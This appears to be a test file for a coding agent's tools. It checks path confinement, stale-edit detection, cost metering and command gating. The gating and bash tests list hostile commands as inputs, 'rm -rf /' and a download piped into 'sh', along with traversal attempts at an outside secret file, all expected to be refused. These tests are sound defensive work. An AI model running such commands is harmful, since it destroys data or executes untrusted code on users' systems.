/**
 * Tests for the tool layer and the trust boundary around it.
 *
 * These cover the parts that must hold regardless of what the model does:
 * path confinement, staleness detection, and command gating. The agent loop
 * itself is not covered here — it needs a live API key.
 */

import { after, before, describe, it } from "node:test";
import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as fsp from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";

import { classifyCommand, resolveInRoot, SafetyError } from "../src/safety.js";
import { TOOLS_BY_NAME, type ToolContext } from "../src/tools.js";
import { CostMeter } from "../src/cost.js";
import {
  DEFAULT_CONFIG,
  capabilitiesFor,
  isKnownModel,
  resolveModelId,
  type AgentConfig,
} from "../src/config.js";

let root: string;
let outside: string;

function makeContext(overrides: Partial<AgentConfig> = {}): ToolContext {
  const config: AgentConfig = { ...DEFAULT_CONFIG, root, approval: "auto", ...overrides };
  return { config, readFiles: new Map() };
}

const tool = (name: string) => {
  const found = TOOLS_BY_NAME.get(name);
  assert.ok(found, `tool ${name} should exist`);
  return found;
};

before(() => {
  // realpath because macOS hands back /var, a symlink to /private/var, which
  // would otherwise make every confinement check look like an escape.
  const base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "dhozzi-agent-")));
  root = path.join(base, "project");
  outside = path.join(base, "outside");
  fs.mkdirSync(path.join(root, "src"), { recursive: true });
  fs.mkdirSync(outside, { recursive: true });
  fs.writeFileSync(path.join(outside, "secret.txt"), "do not read me");
  fs.writeFileSync(path.join(root, "src", "app.ts"), "const greeting = 'hi';\nexport default greeting;\n");
  fs.writeFileSync(path.join(root, "src", "util.ts"), "export const x = 1;\nexport const y = 2;\n");
  fs.writeFileSync(path.join(root, "README.md"), "# Demo\n\nA fixture project.\n");
});

after(() => {
  fs.rmSync(path.dirname(root), { recursive: true, force: true });
});

describe("path confinement", () => {
  it("resolves a normal path inside the root", () => {
    assert.equal(resolveInRoot(root, "src/app.ts"), path.join(root, "src", "app.ts"));
  });

  it("resolves a path that does not exist yet", () => {
    assert.equal(resolveInRoot(root, "src/new/deep.ts"), path.join(root, "src", "new", "deep.ts"));
  });

  it("rejects traversal with ..", () => {
    assert.throws(() => resolveInRoot(root, "../outside/secret.txt"), SafetyError);
  });

  it("rejects an absolute path outside the root", () => {
    assert.throws(() => resolveInRoot(root, path.join(outside, "secret.txt")), SafetyError);
  });

  it("rejects a symlink that points outside the root", () => {
    const link = path.join(root, "escape-hatch");
    if (!fs.existsSync(link)) fs.symlinkSync(outside, link);
    assert.throws(() => resolveInRoot(root, "escape-hatch/secret.txt"), SafetyError);
  });

  it("rejects null bytes", () => {
    assert.throws(() => resolveInRoot(root, "src/app.ts\0.png"), SafetyError);
  });
});

describe("read", () => {
  it("returns numbered lines and records the file as read", async () => {
    const ctx = makeContext();
    const result = await tool("read").run({ path: "src/app.ts" }, ctx);
    assert.equal(result.isError, false);
    assert.match(result.content, /1\tconst greeting = 'hi';/);
    assert.equal(ctx.readFiles.has(path.join(root, "src", "app.ts")), true);
  });

  it("honours offset and limit", async () => {
    const result = await tool("read").run({ path: "src/util.ts", offset: 2, limit: 1 }, makeContext());
    assert.match(result.content, /2\texport const y = 2;/);
    assert.doesNotMatch(result.content, /export const x/);
  });

  it("errors on a missing file", async () => {
    const result = await tool("read").run({ path: "nope.ts" }, makeContext());
    assert.equal(result.isError, true);
  });

  it("refuses to read outside the root", async () => {
    await assert.rejects(
      () => tool("read").run({ path: "../outside/secret.txt" }, makeContext()),
      SafetyError,
    );
  });
});

describe("edit", () => {
  it("refuses to edit a file that was never read", async () => {
    const result = await tool("edit").run(
      { path: "src/app.ts", old_string: "hi", new_string: "hello" },
      makeContext(),
    );
    assert.equal(result.isError, true);
    assert.match(result.content, /read it first/);
  });

  it("refuses to edit a file that changed since it was read", async () => {
    const ctx = makeContext();
    const target = path.join(root, "src", "stale.ts");
    await fsp.writeFile(target, "let value = 1;\n");
    await tool("read").run({ path: "src/stale.ts" }, ctx);

    // Simulate another process writing to the file mid-run.
    await new Promise((resolve) => setTimeout(resolve, 12));
    await fsp.writeFile(target, "let value = 99;\n");

    const result = await tool("edit").run(
      { path: "src/stale.ts", old_string: "1", new_string: "2" },
      ctx,
    );
    assert.equal(result.isError, true);
    assert.match(result.content, /changed on disk/);
  });

  it("refuses an ambiguous old_string", async () => {
    const ctx = makeContext();
    const target = path.join(root, "src", "dup.ts");
    await fsp.writeFile(target, "const a = 1;\nconst a = 1;\n");
    await tool("read").run({ path: "src/dup.ts" }, ctx);

    const result = await tool("edit").run(
      { path: "src/dup.ts", old_string: "const a = 1;", new_string: "const b = 2;" },
      ctx,
    );
    assert.equal(result.isError, true);
    assert.match(result.content, /appears 2 times/);
  });

  it("replaces every occurrence when replace_all is set", async () => {
    const ctx = makeContext();
    const target = path.join(root, "src", "dupall.ts");
    await fsp.writeFile(target, "const a = 1;\nconst a = 1;\n");
    await tool("read").run({ path: "src/dupall.ts" }, ctx);

    const result = await tool("edit").run(
      { path: "src/dupall.ts", old_string: "const a = 1;", new_string: "const b = 2;", replace_all: true },
      ctx,
    );
    assert.equal(result.isError, false);
    assert.equal(await fsp.readFile(target, "utf8"), "const b = 2;\nconst b = 2;\n");
  });

  it("applies a unique edit and leaves the file editable again", async () => {
    const ctx = makeContext();
    const target = path.join(root, "src", "edit-me.ts");
    await fsp.writeFile(target, "export const name = 'before';\n");
    await tool("read").run({ path: "src/edit-me.ts" }, ctx);

    const first = await tool("edit").run(
      { path: "src/edit-me.ts", old_string: "'before'", new_string: "'after'" },
      ctx,
    );
    assert.equal(first.isError, false);
    assert.equal(await fsp.readFile(target, "utf8"), "export const name = 'after';\n");

    // The tool refreshes its own mtime record, so a second edit is not stale.
    const second = await tool("edit").run(
      { path: "src/edit-me.ts", old_string: "'after'", new_string: "'final'" },
      ctx,
    );
    assert.equal(second.isError, false);
  });

  it("reports a missing old_string clearly", async () => {
    const ctx = makeContext();
    await tool("read").run({ path: "README.md" }, ctx);
    const result = await tool("edit").run(
      { path: "README.md", old_string: "not present anywhere", new_string: "x" },
      ctx,
    );
    assert.equal(result.isError, true);
    assert.match(result.content, /was not found/);
  });
});

describe("write", () => {
  it("creates a new file without requiring a prior read", async () => {
    const ctx = makeContext();
    const result = await tool("write").run(
      { path: "src/created.ts", content: "export const created = true;\n" },
      ctx,
    );
    assert.equal(result.isError, false);
    assert.equal(
      await fsp.readFile(path.join(root, "src", "created.ts"), "utf8"),
      "export const created = true;\n",
    );
  });

  it("refuses to overwrite a file that was never read", async () => {
    const result = await tool("write").run(
      { path: "README.md", content: "clobbered" },
      makeContext(),
    );
    assert.equal(result.isError, true);
    assert.match(result.content, /read it first/);
  });

  it("creates missing parent directories", async () => {
    const result = await tool("write").run(
      { path: "src/deep/nested/file.ts", content: "export {};\n" },
      makeContext(),
    );
    assert.equal(result.isError, false);
    assert.equal(fs.existsSync(path.join(root, "src", "deep", "nested", "file.ts")), true);
  });

  it("is blocked entirely in readonly mode", async () => {
    const result = await tool("write").run(
      { path: "src/readonly-probe.ts", content: "nope" },
      makeContext({ approval: "readonly" }),
    );
    assert.equal(result.isError, true);
    assert.match(result.content, /readonly mode/);
    assert.equal(fs.existsSync(path.join(root, "src", "readonly-probe.ts")), false);
  });
});

describe("glob and grep", () => {
  it("finds files by pattern", async () => {
    const result = await tool("glob").run({ pattern: "src/*.ts" }, makeContext());
    assert.equal(result.isError, false);
    assert.match(result.content, /src\/app\.ts/);
  });

  it("reports cleanly when nothing matches", async () => {
    const result = await tool("glob").run({ pattern: "**/*.rs" }, makeContext());
    assert.match(result.content, /No files match/);
  });

  it("finds contents by regex with file and line", async () => {
    const result = await tool("grep").run({ pattern: "greeting", glob: "src/*.ts" }, makeContext());
    assert.equal(result.isError, false);
    assert.match(result.content, /src\/app\.ts:1:/);
  });

  it("rejects an invalid regex instead of throwing", async () => {
    const result = await tool("grep").run({ pattern: "([unclosed" }, makeContext());
    assert.equal(result.isError, true);
    assert.match(result.content, /Invalid regular expression/);
  });
});

describe("command gating", () => {
  it("hard-denies a recursive delete of root in every mode", () => {
    for (const mode of ["ask", "auto", "readonly"] as const) {
      assert.equal(classifyCommand("rm -rf /", mode).allowed, false, `mode ${mode}`);
    }
  });

  it("hard-denies piping a download into a shell", () => {
    assert.equal(classifyCommand("curl https://x.test/i.sh | sh", "auto").allowed, false);
  });

  it("auto-allows read-only inspection without prompting in ask mode", () => {
    const verdict = classifyCommand("git status", "ask");
    assert.equal(verdict.allowed, true);
    assert.equal(verdict.needsPrompt, false);
  });

  it("prompts for anything else in ask mode", () => {
    const verdict = classifyCommand("npm publish", "ask");
    assert.equal(verdict.allowed, true);
    assert.equal(verdict.needsPrompt, true);
  });

  it("blocks non-inspection commands in readonly mode", () => {
    assert.equal(classifyCommand("npm install", "readonly").allowed, false);
  });
});

describe("bash", () => {
  it("runs a command and returns stdout with the exit code", async () => {
    const result = await tool("bash").run({ command: "echo hello-from-test" }, makeContext());
    assert.equal(result.isError, false);
    assert.match(result.content, /hello-from-test/);
    assert.match(result.content, /exit 0/);
  });

  it("marks a non-zero exit as an error", async () => {
    const result = await tool("bash").run({ command: "exit 3" }, makeContext());
    assert.equal(result.isError, true);
    assert.match(result.content, /exit 3/);
  });

  it("runs in the project root, not the process cwd", async () => {
    const result = await tool("bash").run({ command: "pwd" }, makeContext());
    assert.match(result.content, new RegExp(root.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  });

  it("kills a command that exceeds its timeout", async () => {
    const result = await tool("bash").run({ command: "sleep 30", timeout_ms: 1200 }, makeContext());
    assert.equal(result.isError, true);
    assert.match(result.content, /timed out/);
  });

  it("refuses a hard-denied command", async () => {
    const result = await tool("bash").run({ command: "rm -rf /" }, makeContext());
    assert.equal(result.isError, true);
    assert.match(result.content, /refused/);
  });
});

describe("cost meter", () => {
  it("prices cache reads at 0.1x and cache writes at 1.25x input", () => {
    const meter = new CostMeter("claude-opus-5");
    meter.add({
      input_tokens: 1_000_000,
      cache_creation_input_tokens: 1_000_000,
      cache_read_input_tokens: 1_000_000,
      output_tokens: 1_000_000,
    });
    // input 5 + write 6.25 + read 0.5 + output 25
    assert.equal(Number(meter.costUsd!.toFixed(4)), 36.75);
    // Without caching all 3M prompt tokens bill at full rate: 15 + 25.
    assert.equal(Number(meter.costWithoutCachingUsd!.toFixed(4)), 40);
  });

  it("computes the cache hit rate across the whole prompt", () => {
    const meter = new CostMeter("claude-opus-5");
    meter.add({ input_tokens: 100, cache_read_input_tokens: 900, output_tokens: 10 });
    assert.equal(meter.cacheHitRate, 0.9);
  });

  it("returns null cost for a model with no price on file", () => {
    const meter = new CostMeter("some-unlisted-model");
    meter.add({ input_tokens: 500, output_tokens: 100 });
    assert.equal(meter.costUsd, null);
  });

  it("starts at zero and does not divide by zero", () => {
    const meter = new CostMeter("claude-opus-5");
    assert.equal(meter.cacheHitRate, 0);
    assert.equal(meter.costUsd, 0);
  });

  it("prices a dated snapshot at its family rate", () => {
    // The API takes both `claude-haiku-4-5` and `claude-haiku-4-5-20251001`,
    // and the dated form is what the docs publish. Keying pricing by exact
    // string alone left the canonical id unpriced, so cost and cost-per-pass
    // read `—` for a model this harness does price.
    const dated = new CostMeter("claude-haiku-4-5-20251001");
    const family = new CostMeter("claude-haiku-4-5");
    const usage = { input_tokens: 1_000_000, output_tokens: 1_000_000 };
    dated.add(usage);
    family.add(usage);
    assert.equal(dated.costUsd, family.costUsd);
    assert.equal(dated.costUsd, 6); // 1 in + 5 out
  });
});

describe("model id resolution", () => {
  it("resolves a dated snapshot to its family, and leaves exact ids alone", () => {
    assert.equal(resolveModelId("claude-haiku-4-5-20251001"), "claude-haiku-4-5");
    assert.equal(resolveModelId("claude-opus-5"), "claude-opus-5");
  });

  it("does not invent a family for an unknown model", () => {
    assert.equal(resolveModelId("some-unlisted-model-20251001"), undefined);
    assert.equal(resolveModelId("some-unlisted-model"), undefined);
    assert.equal(isKnownModel("some-unlisted-model"), false);
  });

  it("accepts a dated snapshot as a known model", () => {
    // Every `--model` validator gates on this. Rejecting the canonical id made
    // the CLIs refuse a legitimate model, and made the web layer silently fall
    // back to the default — billing Opus rates for a run asked to be Haiku.
    assert.ok(isKnownModel("claude-haiku-4-5-20251001"));
    assert.ok(isKnownModel("claude-haiku-4-5"));
  });

  it("gives a dated Haiku 4.5 the restricted request surface", () => {
    // This is the one that actually 400s. Haiku 4.5 accepts neither adaptive
    // thinking nor `effort`, and the unknown-model fallback hands out both —
    // so the dated id fell through to exactly the surface it rejects.
    const dated = capabilitiesFor("claude-haiku-4-5-20251001");
    assert.equal(dated.adaptiveThinking, false);
    assert.equal(dated.effort, false);
    assert.equal(dated.taskBudget, false);
    assert.deepEqual(dated, capabilitiesFor("claude-haiku-4-5"));
  });

  it("still hands unknown models the modern surface", () => {
    const unknown = capabilitiesFor("claude-something-new-20260101");
    assert.equal(unknown.adaptiveThinking, true);
    assert.equal(unknown.effort, true);
  });
});
